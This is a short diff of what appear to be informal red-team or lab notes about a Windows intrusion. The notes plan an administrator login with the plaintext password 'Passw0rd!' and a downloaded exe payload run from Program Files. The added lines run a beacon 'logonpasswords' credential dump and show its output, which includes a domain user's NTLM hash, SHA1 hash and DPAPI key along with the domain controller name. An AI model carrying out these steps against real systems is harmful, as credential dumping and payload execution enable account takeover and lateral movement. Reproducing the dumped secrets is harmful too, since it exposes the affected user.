@@ -48,3 +48,19 @@ BUILTIN\Administrators                            Alias                    S-1-5
 so we're in the administrators group?? lets try to start new seesion as admin?
 we can just login as administrator with Passw0rd! 
 then we download a http exe payload and move to program files, then run it
+
+now as admin, lets get some creds
+beacon> logonpasswords
+
+    User Name         : etate
+    Domain            : DUBLIN
+    Logon Server      : DUB-DC-1
+    Logon Time        : 28/04/2026 15:46:19
+    SID               : S-1-5-21-2958544638-1589230383-838459903-3601
+        msv :	
+        [00000003] Primary
+        * Username : etate
+        * Domain   : DUBLIN
+        * NTLM     : f4da116176df371cafa28d8064de9c2e
+        * SHA1     : c95c2b652c9e3fb2d4370638b4a8d083b9dd8759
+	    * DPAPI    : 8f92469378250718cb4da928ee6372e7
